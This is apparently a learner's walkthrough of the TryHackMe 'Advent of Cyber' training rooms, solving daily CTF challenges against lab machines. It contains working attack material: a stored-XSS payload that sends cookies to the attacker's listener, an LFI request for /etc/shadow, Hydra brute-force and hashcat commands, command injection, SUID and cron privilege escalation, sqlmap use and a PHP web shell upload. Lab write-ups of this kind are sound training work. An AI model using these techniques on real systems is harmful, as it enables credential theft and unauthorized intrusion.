# Advent of Cyber

[link to room](https://tryhackme.com/room/25daysofchristmas)

## Day 1 : Inventory Management 
#### 1.	What is the name of the cookie used for authentication?
	
	Go to the <machine IP:3000> and register yourself then refresh the page
	Press CTRL + SHIFT + I to access the Developer Consoloe
	Go to Applications tab and click on Cookies 

	auth<redacted>

#### 2.	If you decode the cookie, what is the value of the fixed part of the cookie?
	
	Access the cookie and decode the value which is encoded in base64(%3D is '=')
	Your username is the first part and second part will be same for everybody

	v4er9<redacted>

#### 3. After accessing his account, what did the user 'mcinventory' request?
	
	user = mcinventory
	we know the second part of cookie
	encode 'mcinventoryv4er9111!ss' into base64(you can search online for tools)
	bWNpbnZlbnRvcnl2NGVyOWxsMSFzcw%3D%3D
	copy and paste it into the value and press enter and refresh

	fire<redacted>

##  Day 2 : Arctic Forum 
#### 1.	What is the path of the hidden page?

	Recommended tool is DirSearch but we will use gobuster
	we will use the the recommended wordlist
	run 'gobuster -u http://<machine IP>:3000 -w /path/to/wordlist'

	/Sys<redacted>

#### 2.	What is the password you found?
	
	goto http://<machine IP>:3000/sysadmin
	check the page source
	"Admin Portal Created by Arctic Digital Design - check out github repo"
	google it 


    username: admin
    password: <redacted>word

#### 3.	What do you have to take to the 'partay'

	goto http://<machine IP>:3000/sysadmin
	login with default credentials
	You will see a note
	Hey all - Please don't forget to BYOE(Bring Your Own <redacted>) for the partay!!

	Egg<redacted>

## Day 3 : Evil Elf
#### 1.	Whats the destination IP on packet number 998?
	Download the embeded file (Evil Elf.pcap)
	Open it with Wireshark
	Move to Packet No. 998 

	63.32.<redacted>

#### 2.	What item is on the Christmas list?

	filter by telnet and click on Packet No. 2255

	ps<redacted>


#### 3.	Crack buddy's password!
	filter by telnet and click in Packet No. 2908
	Copy the hash its SHA-512
	paste just the hash
	Use hashcat to crack 
	hashcat -a 0 -m 1800 john.hash /usr/share/wordlists/rockyou.txt --force

	rain<redacted>

## Day 4 : Training 

	username: mcsysadmin
	password: bestelf1234

#### 1.	How many visible files are there in the home directory(excluding ./ and ../)?

	<redacted>	

#### 2.	What is the content of file5?
	
	reci<redacted>

#### 3.	Which file contains the string ‘password’?

	grep -l -e "password" -f *
	
	<redacted>

#### 4. What is the IP address in a file in the home folder?
	
	cat * | grep -Eo "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
	
	10.<redacted>.5

#### 5. How many users can log into the machine?

	<redacted>

#### 6. What is the sha1 hash of file8?
	
	sha1sum file8
	
	<redacted>

#### 7. What is mcsysadmin’s password hash?

	search for bak files using locate shadow | grep bak , (find / -type f -name *.bak)
	
	<redacted>

## Day 5 : Ho-Ho-Hosint
#### 1. What is Lola's date of birth? Format: Month Date, Year(e.g November 12, 2019)
	
	use exiftools to see metadata and search creator name in twitter
	
	<redacted>
	
#### 2. What is Lola's current occupation?

	In twitter 
	
	December<redacted>,1900

#### 3. What phone does Lola make?
	
	Go through posts in twitter 
	
	<redacted> X

#### 4. What date did Lola first start her photography? Format: dd/mm/yyyy

	Go WayBackMachine and put the lola's website and navigate to the earliest date 
	here we see earliest date is October 23, 2019 navigate to it
	
	23/<redacted>

#### 5. What famous woman does Lola have on her web page?

	go to her webpage that you found in her twitter accound
	Download the ladies photo and use reverse image search using google
	
	ada <redacted>

## Day 6 : Data Elf-iltration 
#### 1. What data was exfiltrated via DNS?
	
	open file in wireshark and apply dns filter
	Spot which packet is querying a hex string subdomain of the holidaythief.com domain. 
	You can decode hex into ascii by echo hex string | xxd -r -p
	
	Candy Cane <redacted>

#### 2. What did Little Timmy want to be for Christmas?
	
	download the packet which is quering google.com
	extract hidden info from 'TryHackMe.jpg' using steghide extract -sf <path>
	subheading of is what we looking for
	
	<redacted>

#### 3. What was hidden within the file?
	
	crack the zip file using fcrackzip (download it using apt-get install fcrackzip)
	Enter the password (december) and concatenate Timmy file
	
	RFC <redacted>

## Day 7 : Skilling Up

	nmap -sC -sV -O <machine-ip>

#### 1. how many TCP ports under 1000 are open?

	<redacted>

#### 2. What is the name of the OS of the host?

	<redacted>ux

#### 3. What version of SSH is running?

	<redacted>.4

#### 4. What is the name of the file that is accessible on the server you found running?

	check web server running on port 999
	<redacted>.file

## Day 8 : SUID Shenanigans

	Username: holly
	Password: <redacted>

#### 1. What port is SSH running on?

	<redacted>34

#### 2. Find and run a file as igor. Read the file /home/igor/flag1.txt
	
	find / -user igor -perm -4000 -exec ls -ldb {} \;
	we see that find command is owned by igor but we can also run
	touch foo
	find foo -exec cat /home/igor/flag1.txt \;

	<redacted>

#### 3. Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?
	
	find / -user igor -perm -4000 -exec ls -ldb {} \;
	in most cases, you have to go throgh all binaries or look for suspicious one which in this case is system-control
	run it and it ask for user input to run a command if we run whoami it returns root we can use to cat our flag2 or spawn a root shell by giving it /bin/bash as input

	<redacted>

#### 4. If you've finished the challenge and want more practise, checkout the Privilege Escalation Playground room created by SherlockSec: https://tryhackme.com/room/privescplayground
	
	No answer needed

## Day 9 : Requests
#### 1. What is the value of the flag?
	
	sCrIP<redacted>

## Day 10 : Metasploit-a-ho-ho-ho

	exploit(multi/http/struts2_content_type_ognl) > set TARGETURI showcase.action

#### 1. Compromise the web server using Metasploit. What is flag1?
	
	find / 2>>/dev/null | grep -i "flag"
	<redacted>

#### 2. Now you've compromised the web server, get onto the main system. What is Santa's SSH password?
	
	santa:<redacted>

#### 3. Who is on line 148 of the naughty list?
	
	sed '52!d' nice_list.txt 
	<redacted>

#### 4. Who is on line 52 of the nice list?
	
	sed '148!d' naughty_list.txt
	<redacted>

## Day 11 : Elf Applications 
#### 1 	What is the password inside the creds.txt file?

	<redacted>

#### 2. What is the name of the file running on port 21?

	file<redacted>

#### 3. What is the password after enumerating the database?
	
	best<redacted>

## Day 12 : Elfcryption

#### 1. What is the md5 hashsum of the encrypted note1 file?

	md5sum file

	<redacted>

#### 2. Where was elf Bob told to meet Alice?

	gpg -d file and enter the password (25daysofchristmas)

	<redacted>

#### 3. Decrypt note2 and obtain the flag!

	openssl rsa -in private.key -pubout -out public.key and enter the password (hello)
	openssl rsautl -decrypt -inkey private.key -in encrypted_file -out decrypted.txt

	<redacted>

## Day 13 : Accumulate

#### 1. A web server is running on the target. What is the hidden directory which the website lives on?
	nmap -sC -sV -Pn -oN nmap_day13.txt machine-ip
```bash
gobuster dir -u http://10.10.237.165/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 35
```
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.237.165/
[+] Threads:        35
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/21 03:36:27 Starting gobuster
===============================================================
/????? (Status: 301)
Progress: 12292 / 220561 (5.57%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/06/21 03:38:01 Finished
===============================================================
```

> /r????

#### 2. Gain initial access and read the contents of user.txt
	After visiting the directory we found a username `wade` and a blog
```
Contents of blog:
I can’t believe the movie based on my favorite book of all time is going to come out in a few days! Maybe it’s because my name is so similar to the main character, but I honestly feel a deep connection to the main character Wade. I keep mistyping the name of his avatar whenever I log in but I think I’ll eventually get it down. Either way, I’m really excited to see this movie! 
```
After checking the comments of of the post i was able to get the password of the user
After logging in you will see the user flag on desktop

> THM{HACK_??????????}


#### 3. [Optional] Elevate privileges and read the content of root.txt

We will also see a executable named hhupd.exe on the desktop lets research on it
After searching i was able to get the vulnerabilty that will escalate our privileges to root/Administrator

[Github link to exploit we will use](https://github.com/jas502n/CVE-2019-1388)

After successful exploitataion, you will get a command prompt with Administrator privileges

```
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\System32>powershell -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users> cd .\Administrator
PS C:\Users\Administrator> cd .\Desktop
PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/23/2020  10:34 AM             31 root.txt


PS C:\Users\Administrator\Desktop> type root.txt
THM{COIN????????????????????}
PS C:\Users\Administrator\Desktop>
```

## Day 14 : Unknown Storage

#### 1. What is the name of the file you found?

You can use check the bucket by simply browsing

```bash
firefox http://advent-bucket-one.s3.amazonaws.com/
```
```
Contents of webpage:
<ListBucketResult>
<Name>advent-bucket-one</Name>
<Prefix/>
<Marker/>
<MaxKeys>1000</MaxKeys>
<IsTruncated>false</IsTruncated>
<Contents>
<Key>employee??????.txt</Key>
<LastModified>2019-12-14T15:53:25.000Z</LastModified>
<ETag>"e8d2d18588378e0ee0b27fa1b125ad58"</ETag>
<Size>7</Size>
<StorageClass>STANDARD</StorageClass>
</Contents>
</ListBucketResult>
```
> employee_??????


#### 2. What is in the file?

We can also simply check the whats inside the file by browsing to it
```bash
firefox http://advent-bucket-one.s3.amazonaws.com/employee_??????
```

> mc?????

## Day 15 :LFI

#### 1. What is Charlie going to book a holiday to?

> check the website to answer the question (Haw???)

#### 2. Read /etc/shadow and crack Charlies password.
	
	use burpsuite to manipulate the request and change the header (GET /get-file/%2fetc%2fshadow HTTP/1.1)
	and crack the hash and login to machine using ssh

#### 3. What is flag1.txt?
	
	THM{4ea2adf84????????????????}

## Day 16 :File Confusion

![day 16 script](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day16.png)

For this task you have to create a python script to automate the task
I have already created the [script](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day16-script.py) but i encourage you to make it yourself but if you stuck than you can get the guidance from here

#### 1. How many files did you extract(excluding all the .zip files)?

> ?0

#### 2. How many files contain Version: 1.1 in their metadata?

> ?

#### 3. Which file contains the password?

> ????.txt

## Day 17 : Hydra-ha-ha-haa

#### 1. Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)

```bash
hydra -l molly -P ../../rockyou.txt 10.10.252.242 http-post-form "/login:username=^USER^&password=^PASS^&Login=Login:Your username or password is incorrect."
```

```
Results:
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.                                                                                     
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-25 12:33:46       
[DATA] max 16 tasks per 1 server, overall 16 tasks, 128212 login tries (l:1/p:128212), ~8014 tries per task
[DATA] attacking http-post-form://10.10.100.129:80/login:username=^USER^&password=^PASS^:F=incorrect                                                         
[80][http-post-form] host: 10.10.100.129   login: molly   password: ??????       
1 of 1 target successfully completed, 1 valid password found                       
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-25 12:33:59
```
> enter the creds and you will get the flag

#### 2. Use Hydra to bruteforce molly's SSH password. What is flag 2?

```bash
hydra -l molly -P path/to/wordlist ssh://10.10.252.242
```
```
Hydra Results:
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-25 11:51:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 128212 login tries (l:1/p:128212), ~8014 tries per task
[DATA] attacking ssh://10.10.252.242:22/
[22][ssh] host: 10.10.252.242   login: molly   password: ????????
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-25 11:51:24
```

> login to ssh and you will ge the flag

## Day 18 : Elf JS

#### 1. What is the admin's authid cookie value?

They have given us a webpage at port 3000, first create an account and lets check if this site vulnerable or not

![day18-1](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day18-1.png)

now press F12 and open console 

![day18-2](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day18-2.png)

and yay thats vulnerable and now exploit this to get admin authid

first open your terminal and run netcat as root to listen for incoming connections
```bash
nc -lnvp 80
```

after that put this into imput section and press submit

```bash
</p><script>window.location = 'http://<your-tun0-ip>/page?param=' + document.cookie; </script><p>
```

now lets wait for admin to login to the page and we will admin authid but this is unrealistic attack as this will quickly make the page unaccessible

![day18-3](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day18-3.png)

## Day 19 : Commands

we will given a webserver at port 3000 and they told us that they have found something suspicious at /api/cmd lets navigate there and see whats going on

![day19-1](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day19-1.png)

we will get no response but lets parse a command to check if that works

![day19-2](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day19-2.png)

now lets hunt for flag

put find / -name user.txt this command after the http://machine-ip/api/cmd 

![day19-3](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day19-3.png)

now lets cat the flag but simply concatinating the flag doesn't work so we have to encode the url 
you can do by visiting at this site https://www.urlencoder.org/

now lets enter this into url http://machine-ip/api/cmd/cat%20%2Fhome%2Fbestadmin%2Fuser.txt

![day19-4](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day19-4.png)

## Day 20 : Cronjob Privilege Escalation

#### 1. What port is SSH running on?

```bash
nmap -p1-9999 10.10.251.78
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 09:36 EDT
Nmap scan report for 10.10.251.78
Host is up (0.20s latency).
Not shown: 9998 closed ports
PORT     STATE SERVICE
****/tcp open  tram
Nmap done: 1 IP address (1 host up) scanned in 182.66 seconds
```

#### 2. Crack sam's password and read flag1.txt

use hydra to crack sam's password
```bash
hydra -l sam -P ../rockyou.txt ssh://10.10.251.78 -s port
```

![day20-1](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day20-1-updated.png)

#### 3. Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?

Now if check around we see that flag2 is in ubuntu directory and there's script clean-up.sh which is definetly running by crontab now lets abuse this

![day20-2](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day20-2.png)

## Day 21 : Elf Engineering

Download the file and run the challenge1 as `r2 -d challenge1` this will open the binary in debugging mode and run aa to analyze the program

![day21-1](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day21-1.png)

Once the analyzing is done we analyze the main function by using this command `pdf @main`

![day21-2](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day21-2.png)

Now they have asked us three questions, 1. value of local ch , 2. value of eax imul, 3. value of local 4h before eax is 0, lets mark those memory address.

![day21-3](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day21-3.png)

Now, lets set a breakpoint at all those memory addresses by `db <memory address>`

![day21-4](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day21-4.png)

After setting a breakpoint we see a b corresponding to those memory addresses

Now, lets run the program by using `dc` and we will hit a breakpoint

![day21-5](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day21-5.png)

#### 1. What is the value of local_ch when its corresponding movl instruction is called(first if multiple)?

After hitting the first breakpoint, we will check for contents of local_ch which in my case is var_ch by using `px <memory address` and we can also use reference(check the very first lines of main function)
But we don't get the answer, for that we have to move one line forward by using `ds` and on very first address we will get the answer

![day21-6](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day21-6.png)

#### 2. What is the value of eax when the imull instruction is called?

lets run the program again and we will see that the breakpoint has been hit

![day21-7](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day21-7.png)

but eax is a register so we will check it by running a query `dr` but once again we have to move on line by using `ds`

![day21-8](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day21-8.png)

#### 3. What is the value of local_4h before eax is set to 0?
Run the program again and we will hit the second breakpoint

![day21-9](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day21-9.png)

lets move one line forward and check the contents of local_4h which also in my case is var_4h

![day21-10](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day21-10.png)

## Day 22 : If Santa , then Christmas

This challenge is also same as before, So i won't be telling everything in detail
Like before lets open the if2 binary in debugging mode and analyze it and it also contains a main function. Lets have a look at it

![day22-1](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day22-1.png)

Now both questions ask for the values at the end of main functions, so we will set a single breakpoint at the end of main function and look at both values from there 

![day22-2](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day22-2.png)

To double check that breakpoint has been set we will check the main function again

![day22-3](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day22-3.png)

lets run the program and we will hit the execution

![day22-4](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day22-4.png) 

#### 1. what is the value of local_8h before the end of the main function?

after hitting the breakpoint, we will check the content of local_8h

![day22-5](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day22-5.png)

#### 2. what is the value of local_4h before the end of the main function?

We will check the content of local_4h

![day22-6](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day22-6.png)

## day 23 : LapLANd (Sql Injection)

we will use burpsuite and sqlmap for this task
capture the request in burpsuite and save it as request.txt so that we can use it in sqlmap
![day23-1](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day23-1.png)
![day23-2](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day23-2.png)
#### Which field is SQL injectable? Use the input name used in the HTML code.

```bash
sqlmap -r path/to/request.txt --dbs
```
![day23-3](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day23-3.png)

#### What is Santa Claus' email address?

now that we have database lets enumerate it
```bash
sqlmap -r request.txt -D social --tables --batch
```
![day23-4](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day23-4.png)

lets further enumerate users

```bash
sqlmap -r request.txt -D social -T users --column --batch
```

![day23-5](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day23-5.png)

lets further enumerate to get username,email and passwords

![day23-6](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day23-6.png)

#### What is Santa Claus' plaintext password?

i will skip the part of manually cracking the hash crack it online using crackstation

![day23-7](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day23-7.png)

#### Santa has a secret! Which station is he meeting Mrs Mistletoe in?

check the messages of Mrs Mistletoe

![day23-8](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day23-8.png)

#### Once you're logged in to LapLANd, there's a way you can gain a shell on the machine! Find a way to do so and read the file in /home/user/

Lets upload a php shell but this server has filtered out files with php extensions so lets rename it to .phtml and upload that but before that set up a listener

![day23-9](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day23-9.png)

As soon as we upload our shell we automatically got a shell

![day23-10](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day23-10.png)

![day23-11](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day23-11.png)

![day23-12](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day23-12.png)

## Elf stalk

lets enumerate the machine using nmap 

![day24-1](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day24-1.png)

***we’re interested in ports 5601 (Kibana), 8000 (Logstack) and 9200 (Elastic Search).***

### Find the password in the database

***port 9200***
```Elastic Search is a search engine, and that the correct way to search withits connected database is by appending /_search?q=<query> to the url```

![day24-2](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day24-2.png)

#### Read the contents of the /root.txt file

***Lets check KIBANA on port 5601***

![day24-3](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day24-3.png)

By doing a quick google search `kibana 6.4.2 cve` we will find that CVE-2018–17246 which tells us that its vulnerable to LFI(local file inclusion)

![day24-4](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day24-4.png)

lets check the flag thats in root directory (/) 

![day24-5](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day24-5.png)

but this will just hang the webserver now lets check the logs
***port 8000***

![day24-6](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day24-6.png)

now lets go the gibberish language and we will eventually find the flag

![day24-7](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day24-7.png)
